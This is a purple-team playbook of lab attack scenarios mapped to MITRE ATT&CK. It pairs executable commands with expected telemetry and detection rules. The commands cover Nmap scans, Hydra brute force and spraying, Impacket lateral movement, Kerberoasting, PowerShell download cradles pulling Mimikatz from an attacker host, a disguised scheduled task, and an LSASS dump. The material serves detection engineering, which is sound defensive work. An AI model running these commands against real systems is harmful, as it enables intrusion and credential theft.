# Attack Simulation Scenarios

## Overview

This document provides comprehensive attack simulation scenarios aligned with the MITRE ATT&CK framework. Each scenario includes detailed execution procedures, expected telemetry, and detection requirements. Scenarios are designed for execution in the documented environment using specified tools.

---

## Scenario Matrix

| Scenario ID | Name | MITRE Tactics | Complexity | Duration | Tools |
|-------------|------|---------------|------------|----------|-------|
| AS-001 | Network Reconnaissance | Reconnaissance | Low | 15 min | Nmap |
| AS-002 | Credential Brute Force | Credential Access | Low | 20 min | Hydra |
| AS-003 | SMB Lateral Movement | Lateral Movement | Medium | 25 min | PsExec, CrackMapExec |
| AS-004 | Active Directory Enumeration | Discovery | Medium | 30 min | Enum4Linux, BloodHound |
| AS-005 | Multi-Stage Attack Chain | Multiple | High | 60 min | Atomic Red Team Suite |

---

## AS-001: Network Reconnaissance

### Objective
Simulate adversary network discovery activities to validate detection of scanning behaviors.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Sub-technique |
|--------------|----------------|--------|---------------|
| T1046 | Network Service Scanning | Discovery | - |
| T1018 | Remote System Discovery | Discovery | - |
| T1083 | File and Directory Discovery | Discovery | - |

### Execution Environment
- **Attacker**: Kali Linux (10.0.0.50)
- **Targets**: Windows Server 2019 DC (10.0.0.10), Windows 10 Endpoint (10.0.0.20), WebSRV (10.0.0.30), DVWA (10.0.0.40)
- **Network**: 10.0.0.0/24

### Execution Procedures

#### Phase 1: Host Discovery

```bash
# ICMP Echo Sweep - Identify live hosts
nmap -sn 10.0.0.0/24 -oN host_discovery_icmp.txt

# TCP SYN Ping - Bypass ICMP filtering
nmap -PS22,80,443,445,3389 -sn 10.0.0.0/24 -oN host_discovery_syn.txt

# ARP Scan - Local segment enumeration
nmap -PR -sn 10.0.0.0/24 -oN host_discovery_arp.txt
```

#### Phase 2: Port Scanning

```bash
# TCP Connect Scan - Full port range against Domain Controller
nmap -sT -p- -T4 --open 10.0.0.10 -oN dc_full_tcp.txt

# SYN Stealth Scan - Common ports across subnet
nmap -sS -p21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,5985,8080,8443,9200,9300 -T4 10.0.0.0/24 -oN subnet_syn_scan.txt

# Service Version Detection
nmap -sV -p53,88,135,139,445,464,593,636,3268,3269,3389,5985,9389 10.0.0.10 -oN dc_service_versions.txt

# OS Fingerprinting
nmap -O --osscan-guess 10.0.0.10 10.0.0.20 -oN os_fingerprint.txt
```

#### Phase 3: Vulnerability Scanning

```bash
# NSE Script Scan - Vulnerability detection
nmap --script vuln -p80,443,445 10.0.0.10 10.0.0.20 -oN vulnerability_scan.txt

# SMB Security Check
nmap --script smb-security-mode,smb-enum-shares,smb-enum-users -p445 10.0.0.10 -oN smb_security_audit.txt
```

### Expected Network Telemetry

| Source | Event Type | Expected Data |
|--------|------------|---------------|
| pfSense/Suricata | ET SCAN Nmap User-Agent | Nmap version string in probes |
| pfSense/Suricata | ET SCAN Potential Port Scan | Multiple ports from single source |
| pfSense/Suricata | ET SCAN Nmap Scripting Engine | NSE script execution signatures |
| pfSense/Suricata | GPL SCAN SYN FIN Scan | TCP flag anomalies |
| pfSense/Suricata | ET SCAN Suspicious User-Agent | Non-standard HTTP user agents |

### Expected Windows Telemetry (Target Systems)

| Source | Event ID | Description |
|--------|----------|-------------|
| Sysmon | 3 | Network connection from nmap.exe (if installed) |
| Sysmon | 22 | DNS query for target hostnames |
| Windows Security | 5156 | Windows Filtering Platform permitted connection |
| Windows Security | 5158 | Windows Filtering Platform permitted bind |
| Windows Firewall | 2004 | Firewall rule match (if logging enabled) |

### Detection Requirements

| Detection Name | Logic | Severity |
|----------------|-------|----------|
| DET-NET-001 | >50 connection attempts from single source to multiple ports within 60 seconds | Medium |
| DET-NET-002 | Nmap user-agent or probe signature detected | Medium |
| DET-NET-003 | Sequential port scanning pattern (ports 1-1000) | High |
| DET-NET-004 | Combination of ICMP sweep followed by TCP SYN to multiple hosts | Medium |
| DET-NET-005 | OS fingerprinting probe sequence detected | Medium |

---

## AS-002: Credential Brute Force

### Objective
Simulate password brute force attacks against network services to validate authentication monitoring and failed login detection.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Sub-technique |
|--------------|----------------|--------|---------------|
| T1110 | Brute Force | Credential Access | T1110.001 - Password Guessing |
| T1110 | Brute Force | Credential Access | T1110.003 - Password Spraying |
| T1552 | Unsecured Credentials | Credential Access | T1552.001 - Credentials In Files |

### Execution Environment
- **Attacker**: Kali Linux (10.0.0.50)
- **Targets**: Windows Server 2019 DC (10.0.0.10), DVWA (10.0.0.40)
- **Services**: SMB (445), RDP (3389), SSH (22), HTTP Basic Auth (80)

### Execution Procedures

#### Phase 1: SMB Brute Force

```bash
# Install Hydra if not present
sudo apt-get update && sudo apt-get install -y hydra

# Create username list
cat > users.txt << EOF
administrator
admin
svc_sql
svc_backup
john.doe
jane.smith
EOF

# Create password list
cat > passwords.txt << EOF
Password123
Welcome1
Spring2024
Company123!
Admin123
EOF

# SMB Brute Force against Domain Controller
hydra -L users.txt -P passwords.txt smb://10.0.0.10 -t 4 -o hydra_smb_results.txt

# RDP Brute Force (if xfreerdp available)
hydra -L users.txt -P passwords.txt rdp://10.0.0.10 -t 2 -o hydra_rdp_results.txt
```

#### Phase 2: Web Application Brute Force (DVWA)

```bash
# DVWA Login Brute Force
hydra -l admin -P passwords.txt 10.0.0.40 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -t 4 -o hydra_dvwa_results.txt

# HTTP Basic Auth Brute Force (if applicable)
hydra -L users.txt -P passwords.txt 10.0.0.40 http-get -o hydra_http_results.txt
```

#### Phase 3: Password Spraying

```bash
# Password Spraying - Single password against multiple users
hydra -L users.txt -p "Spring2024" smb://10.0.0.10 -t 1 -o spray_smb_results.txt

# Slow password spray to evade threshold detection
for user in $(cat users.txt); do
    hydra -l "$user" -p "Password123" smb://10.0.0.10 -t 1 -W 5
done
```

### Expected Windows Telemetry (Domain Controller)

| Source | Event ID | Description | Critical Fields |
|--------|----------|-------------|-----------------|
| Windows Security | 4625 | Account failed to log on | Account Name, Source IP, Failure Reason, Logon Type |
| Windows Security | 4648 | A logon was attempted using explicit credentials | Target Server, Target Account |
| Windows Security | 4771 | Kerberos pre-authentication failed | User, IP Address, Failure Code |
| Windows Security | 4776 | The computer attempted to validate credentials | Account Name, Source Workstation |
| Windows Security | 4740 | User account was locked out | Account Name, Caller Computer |
| Sysmon | 3 | Network connection to SMB port | Source IP, Destination Port, Image |

### Expected Linux Telemetry (DVWA)

| Source | Log Location | Event Description |
|--------|--------------|-------------------|
| Apache Access Log | /var/log/apache2/access.log | POST /dvwa/login.php with credentials |
| Apache Error Log | /var/log/apache2/error.log | Authentication failures |
| Syslog | /var/log/auth.log | SSH login attempts (if applicable) |
| Suricata | /var/log/suricata/eve.json | HTTP brute force alerts |

### Detection Requirements

| Detection Name | Logic | Severity |
|----------------|-------|----------|
| DET-AUTH-001 | ≥5 failed logons from single source IP within 5 minutes | Medium |
| DET-AUTH-002 | ≥3 failed logons for single account from different source IPs | High |
| DET-AUTH-003 | Failed logon reason 0xC000006A (wrong password) followed by 0xC000006D (bad username) | Medium |
| DET-AUTH-004 | Account lockout event (4740) within 30 minutes of failed logons | High |
| DET-AUTH-005 | Successful logon (4624) immediately after multiple failed attempts (4625) | Critical |
| DET-AUTH-006 | Password spraying pattern: same password, multiple accounts, sequential timing | High |

### Alert Correlation

```yaml
Correlation_Rule_Brute_Force:
  name: "Potential Brute Force Attack"
  condition:
    - event_id: 4625
      count: ">= 5"
      timeframe: "5m"
      group_by: "Source_IP"
  escalation:
    - if: "followed_by event_id 4624 within 1m"
      severity: "Critical"
      description: "Successful brute force - compromised account"
    - if: "followed_by event_id 4740 within 30m"
      severity: "High"
      description: "Account lockout from brute force"
```

---

## AS-003: SMB Lateral Movement

### Objective
Simulate adversary lateral movement using SMB-based tools to validate detection of credential reuse and remote execution.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Sub-technique |
|--------------|----------------|--------|---------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement | - |
| T1570 | Lateral Tool Transfer | Lateral Movement | - |
| T1047 | Windows Management Instrumentation | Execution | - |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence/Execution | - |

### Execution Environment
- **Attacker**: Kali Linux (10.0.0.50)
- **Initial Access**: Windows 10 Endpoint (10.0.0.20) - compromised credentials
- **Target**: Windows Server 2019 DC (10.0.0.10)
- **Credentials**: Compromised from AS-002 (e.g., svc_backup:Spring2024)

### Execution Procedures

#### Phase 1: SMB Share Enumeration

```bash
# Install CrackMapExec
sudo apt-get install -y crackmapexec

# Enumerate SMB shares on target
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' --shares

# List contents of ADMIN$ share
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' --share ADMIN$

# Enumerate all accessible shares
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' -M spider_plus
```

#### Phase 2: PsExec Remote Execution

```bash
# Download PsExec to Kali
wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip

# Using Impacket's psexec.py (more reliable from Linux)
pip install impacket

# Execute remote command via PsExec
psexec.py 'CORP/svc_backup:Spring2024@10.0.0.10' 'whoami'

# Execute with SYSTEM privileges
psexec.py 'CORP/svc_backup:Spring2024@10.0.0.10' -system 'net user'

# Interactive shell
psexec.py 'CORP/svc_backup:Spring2024@10.0.0.10'
```

#### Phase 3: Service-based Execution

```bash
# Using CrackMapExec to execute commands
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' -x 'whoami'
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' -x 'net localgroup administrators'

# Using WMI for execution
wmiexec.py 'CORP/svc_backup:Spring2024@10.0.0.10' 'ipconfig /all'

# Using SMBExec (pass-the-hash capable)
smbexec.py 'CORP/svc_backup:Spring2024@10.0.0.10' 'systeminfo'
```

#### Phase 4: File Transfer and Persistence

```bash
# Upload payload to target
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' --put-file /tmp/payload.exe 'C$\\Windows\\Temp\\payload.exe'

# Execute uploaded payload
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' -x 'C:\Windows\Temp\payload.exe'

# Create scheduled task for persistence
crackmapexec smb 10.0.0.10 -u 'svc_backup' -p 'Spring2024' -x 'schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM'
```

### Expected Windows Telemetry (Target System)

| Source | Event ID | Description | Critical Fields |
|--------|----------|-------------|-----------------|
| Windows Security | 4624 | Successful logon | Logon Type 3 (Network), Logon Type 2 (Interactive via PsExec) |
| Windows Security | 4648 | Explicit credential use | Target Server, Account Used |
| Windows Security | 4672 | Special privileges assigned | SeDebugPrivilege, SeLoadDriverPrivilege |
| Windows Security | 4688 | Process created | CommandLine, ParentProcessName, NewProcessName |
| Windows Security | 5140 | Network share accessed | Share Name, Source IP, Account |
| Windows Security | 5145 | Network share object checked | Share Name, Relative Target Name |
| Sysmon | 1 | Process creation | Image, CommandLine, ParentImage, User |
| Sysmon | 3 | Network connection | Source IP, Destination IP, Image |
| Sysmon | 7 | Image loaded | ImageLoaded (psexesvc.exe, services.exe) |
| Sysmon | 8 | CreateRemoteThread | SourceImage, TargetImage |
| Sysmon | 11 | File created | TargetFilename, Image |
| Sysmon | 13 | Registry value set | TargetObject (Run keys, Services) |

### PsExec-Specific Artifacts

| Artifact | Location | Description |
|----------|----------|-------------|
| psexesvc.exe | C:\Windows\psexesvc.exe | PsExec service binary |
| Service Creation | Registry: HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC | PsExec service registration |
| Event ID 7045 | System Log | Service PSEXESVC installed |
| Event ID 7036 | System Log | Service entered running state |

### Detection Requirements

| Detection Name | Logic | Severity |
|----------------|-------|----------|
| DET-LAT-001 | Event ID 7045 with ServiceName "PSEXESVC" | Critical |
| DET-LAT-002 | Process creation where ParentImage contains "services.exe" and Image is not standard system binary | High |
| DET-LAT-003 | Network logon (4624 Type 3) followed by interactive logon (4624 Type 2) from same source | High |
| DET-LAT-004 | ADMIN$ or C$ share access followed by file creation in Windows\System32 or Windows\Temp | High |
| DET-LAT-005 | CreateRemoteThread from services.exe to non-system process | Critical |
| DET-LAT-006 | Scheduled task creation via network session | High |
| DET-LAT-007 | WMI process creation (wmiprvse.exe spawning child processes) | Medium |

---

## AS-004: Active Directory Enumeration

### Objective
Simulate Active Directory reconnaissance activities to validate detection of discovery behaviors.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Sub-technique |
|--------------|----------------|--------|---------------|
| T1087.002 | Account Discovery: Domain Account | Discovery | - |
| T1083 | File and Directory Discovery | Discovery | - |
| T1135 | Network Share Discovery | Discovery | - |
| T1482 | Domain Trust Discovery | Discovery | - |
| T1069.002 | Permission Groups Discovery: Domain Groups | Discovery | - |
| T1201 | Password Policy Discovery | Discovery | - |

### Execution Environment
- **Attacker**: Kali Linux (10.0.0.50)
- **Target**: Windows Server 2019 DC (10.0.0.10)
- **Credentials**: Domain user (can be low-privilege)

### Execution Procedures

#### Phase 1: Enum4Linux Enumeration

```bash
# Install Enum4Linux-ng
pip install enum4linux-ng

# Basic enumeration
eum4linux-ng -A 10.0.0.10 -oA enum4linux_basic

# Full enumeration with credentials
eum4linux-ng -A 10.0.0.10 -u 'john.doe' -p 'Password123' -oA enum4linux_full

# Specific user enumeration
eum4linux-ng -U 10.0.0.10 -u 'john.doe' -p 'Password123'

# Group enumeration
eum4linux-ng -G 10.0.0.10 -u 'john.doe' -p 'Password123'

# Share enumeration
eum4linux-ng -S 10.0.0.10 -u 'john.doe' -p 'Password123'
```

#### Phase 2: RPC and LDAP Enumeration

```bash
# RPC client enumeration
rpcclient -U 'john.doe%Password123' 10.0.0.10 -c 'enumdomusers'
rpcclient -U 'john.doe%Password123' 10.0.0.10 -c 'enumdomgroups'
rpcclient -U 'john.doe%Password123' 10.0.0.10 -c 'querygroupmem 0x200'

# LDAP enumeration with ldapsearch
ldapsearch -x -H ldap://10.0.0.10 -D 'CN=john.doe,CN=Users,DC=corp,DC=local' -w 'Password123' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName

# LDAP password policy enumeration
ldapsearch -x -H ldap://10.0.0.10 -D 'CN=john.doe,CN=Users,DC=corp,DC=local' -w 'Password123' -b 'DC=corp,DC=local' '(objectClass=domainDNS)' lockoutThreshold

# Enumerate domain trusts
ldapsearch -x -H ldap://10.0.0.10 -D 'CN=john.doe,CN=Users,DC=corp,DC=local' -w 'Password123' -b 'DC=corp,DC=local' '(objectClass=trustedDomain)'
```

#### Phase 3: BloodHound Data Collection

```bash
# Install BloodHound.py
pip install bloodhound

# Collect all data
bloodhound-python -u john.doe -p 'Password123' -d corp.local -dc dc01.corp.local -c All

# Collect specific data types
bloodhound-python -u john.doe -p 'Password123' -d corp.local -dc dc01.corp.local -c Group,LocalAdmin,Session

# Collection with Kerberos authentication
bloodhound-python -u john.doe -k -d corp.local -dc dc01.corp.local -c All
```

#### Phase 4: Kerberos Enumeration

```bash
# Kerberos user enumeration (no credentials required)
python3 /usr/share/kerbrute/kerbrute.py -domain corp.local -users users.txt -dc-ip 10.0.0.10

# AS-REP Roasting check
python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Kerberoasting
python3 GetUserSPNs.py corp.local/john.doe:Password123 -outputfile kerberoast_hashes.txt
```

### Expected Windows Telemetry (Domain Controller)

| Source | Event ID | Description | Critical Fields |
|--------|----------|-------------|-----------------|
| Windows Security | 4624 | Successful logon | Logon Type 3, Logon Process: NtLmSsp or Kerberos |
| Windows Security | 4634 | Account logoff | Session end time |
| Windows Security | 4662 | Operation performed on object | Object Type, Operation Type, Properties |
| Windows Security | 4672 | Special privileges assigned | Privilege List |
| Windows Security | 4768 | Kerberos TGT requested | User, IP, Result Code |
| Windows Security | 4769 | Kerberos service ticket requested | Service Name, User |
| Windows Security | 4776 | Credential validation | Account Name, Source Workstation |
| Windows Security | 5136 | Directory service object modified | LDAP operations |
| Windows Security | 5137 | Directory service object created | Object creation |
| Directory Service | 2889 | LDAP query statistics | Client IP, Search Scope |

### Detection Requirements

| Detection Name | Logic | Severity |
|----------------|-------|----------|
| DET-DISC-001 | Event ID 4662 with high volume (>100/hour) from single source | Medium |
| DET-DISC-002 | LDAP queries for all user objects (objectClass=user) | Medium |
| DET-DISC-003 | LDAP queries for all group objects (objectClass=group) | Medium |
| DET-DISC-004 | Event ID 4768 with Result Code 0x6 (bad username) - user enumeration | Medium |
| DET-DISC-005 | Event ID 4769 with service names containing user accounts (Kerberoasting) | High |
| DET-DISC-006 | Multiple TGT requests (4768) without subsequent TGS requests | Medium |
| DET-DISC-007 | BloodHound ingestion patterns in LDAP queries | High |

---

## AS-005: Multi-Stage Attack Chain

### Objective
Execute a comprehensive attack chain using Atomic Red Team to validate end-to-end detection coverage across multiple MITRE ATT&CK tactics.

### MITRE ATT&CK Coverage

| Tactic | Techniques Covered |
|--------|-------------------|
| Initial Access | T1078 - Valid Accounts, T1190 - Exploit Public-Facing Application |
| Execution | T1059.001 - PowerShell, T1053.005 - Scheduled Task |
| Persistence | T1543.003 - Create Service, T1053.005 - Scheduled Task |
| Privilege Escalation | T1055 - Process Injection, T1078 - Valid Accounts |
| Defense Evasion | T1055 - Process Injection, T1027 - Obfuscated Files |
| Credential Access | T1003.001 - LSASS Memory, T1003.002 - SAM |
| Discovery | T1087 - Account Discovery, T1018 - Remote System Discovery |
| Lateral Movement | T1021.002 - SMB/Windows Admin Shares |
| Collection | T1005 - Data from Local System |
| Exfiltration | T1041 - Exfiltration Over C2 Channel |

### Execution Environment
- **Attacker**: Kali Linux (10.0.0.50) + Purple Kali (10.0.0.60)
- **Initial Target**: Windows 10 Endpoint (10.0.0.20)
- **Secondary Target**: Windows Server 2019 DC (10.0.0.10)
- **Tools**: Atomic Red Team, PowerShell, Custom scripts

### Execution Procedures

#### Phase 1: Initial Access - PowerShell Download

```powershell
# Execute from Windows 10 endpoint (simulating initial compromise)
# T1078 - Valid Accounts (compromised credentials)
# T1059.001 - PowerShell

# Download and execute payload
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.50/Invoke-Mimikatz.ps1')"

# Alternative: Encoded command
powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1ADAALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA=
```

#### Phase 2: Persistence - Scheduled Task

```powershell
# T1053.005 - Scheduled Task/Job
# Create persistence mechanism

schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.50/stage2.ps1')" /sc daily /st 09:00 /ru SYSTEM

# Verify task creation
schtasks /query /tn "WindowsDefenderUpdate" /v
```

#### Phase 3: Privilege Escalation - Token Impersonation

```powershell
# T1134.001 - Token Impersonation/Theft
# Using PowerSploit or custom script

# Load Invoke-TokenManipulation
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.50/Invoke-TokenManipulation.ps1')

# Enumerate tokens
Invoke-TokenManipulation -Enumerate

# Impersonate SYSTEM token
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

#### Phase 4: Credential Access - LSASS Dump

```powershell
# T1003.001 - OS Credential Dumping: LSASS Memory
# Using comsvcs.dll (living off the land)

# Find LSASS PID
$lsass_pid = (Get-Process lsass).Id

# Dump LSASS using comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp full

# Alternative: Use procdump (if available)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

#### Phase 5: Discovery - System and Network Enumeration

```powershell
# T1087 - Account Discovery
# T1018 - Remote System Discovery
# T1135 - Network Share Discovery

# Local user enumeration
Get-LocalUser | Select Name, Enabled, LastLogon

# Domain user enumeration
Get-ADUser -Filter * -Properties SamAccountName, LastLogonDate | Select SamAccountName, LastLogonDate

# Network discovery
1..254 | ForEach-Object { Test-Connection -ComputerName "10.0.0.$_" -Count 1 -ErrorAction SilentlyContinue | Select Address, StatusCode }

# Share enumeration
Get-WmiObject -Class Win32_Share
net view \\10.0.0.10
```

#### Phase 6: Lateral Movement - PsExec

```powershell
# T1021.002 - SMB/Windows Admin Shares
# Using Invoke-PsExec or manual SMB

# Copy payload to admin share
Copy-Item C:\Windows\Temp\payload.exe \\10.0.0.10\ADMIN$\System32\payload.exe

# Execute via WMI
Invoke-WmiMethod -ComputerName 10.0.0.10 -Class Win32_Process -Name Create -ArgumentList "C:\Windows\System32\payload.exe"

# Alternative: Use Invoke-PsExec
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.50/Invoke-PsExec.ps1')
Invoke-PsExec -ComputerName 10.0.0.10 -Command "powershell.exe -EncodedCommand <encoded_payload>" -Username "corp\svc_backup" -Password "Spring2024"
```

#### Phase 7: Data Collection

```powershell
# T1005 - Data from Local System
# T1560 - Archive Collected Data

# Find sensitive files
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.pst -ErrorAction SilentlyContinue | Select FullName, Length

# Archive collected data
Compress-Archive -Path C:\Users\*\Documents\*.docx -DestinationPath C:\Windows\Temp\collection.zip

# Stage for exfiltration
Copy-Item C:\Windows\Temp\collection.zip \\10.0.0.10\C$\Windows\Temp\staged_data.zip
```

### Atomic Red Team Automated Execution

```powershell
# Install Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics

# Import module
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

# Execute specific techniques
Invoke-AtomicTest T1003.001 -TestNumbers 1,2,3
Invoke-AtomicTest T1059.001 -TestNumbers 1,2
Invoke-AtomicTest T1053.005 -TestNumbers 1,2
Invoke-AtomicTest T1021.002 -TestNumbers 1
Invoke-AtomicTest T1087.002 -TestNumbers 1

# Execute all tests for a tactic
Invoke-AtomicTest T1003 -GetTests  # List available tests
Invoke-AtomicTest T1003.001        # Execute default test
```

### Expected Telemetry Summary

| Phase | Key Event IDs (Windows) | Key Event IDs (Sysmon) |
|-------|------------------------|----------------------|
| Initial Access | 4688 (powershell), 800 (PowerShell) | 1, 3, 22 |
| Persistence | 4698 (scheduled task created) | 1, 13 |
| Privilege Escalation | 4672 (special privileges) | 10 (process access), 25 (process tampering) |
| Credential Access | 4656 (object access), 4663 (attempted access) | 10 (LSASS access) |
| Discovery | 4624 (logon for queries), 4662 (LDAP) | 1, 3 |
| Lateral Movement | 4624 (Type 3), 5140 (share access), 7045 (service) | 1, 3, 7, 8, 11 |
| Collection | 4663 (file access) | 11 (file create) |

### Detection Requirements

| Detection Name | Logic | Severity |
|----------------|-------|----------|
| DET-CHAIN-001 | PowerShell download cradle followed by LSASS access | Critical |
| DET-CHAIN-002 | Scheduled task creation by non-admin user | High |
| DET-CHAIN-003 | rundll32.exe accessing lsass.exe | Critical |
| DET-CHAIN-004 | MiniDumpWriteDump API call | Critical |
| DET-CHAIN-005 | Network logon followed by service installation within 5 minutes | Critical |
| DET-CHAIN-006 | Mass file access (>100 files in 1 minute) followed by archive creation | Medium |
| DET-CHAIN-007 | Suspicious PowerShell commands: Invoke-Expression, DownloadString, EncodedCommand | High |

---

## Scenario Execution Checklist

| Step | Action | Verification |
|------|--------|--------------|
| 1 | Verify attacker machine connectivity | `ping 10.0.0.10` |
| 2 | Confirm Sysmon is running on targets | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1` |
| 3 | Verify SIEM ingestion | Check last log received timestamp |
| 4 | Document baseline | Capture 30 minutes of normal activity |
| 5 | Execute scenario | Follow procedures exactly |
| 6 | Capture all telemetry | Export EVTX, Sysmon, SIEM logs |
| 7 | Document alerts generated | Screenshot and export |
| 8 | Analyze detection gaps | Compare expected vs. actual |
| 9 | Generate report | Document findings and remediation |

---

*All scenarios must be executed in isolated lab environments only. Unauthorized execution against production systems is prohibited and may violate applicable laws.*
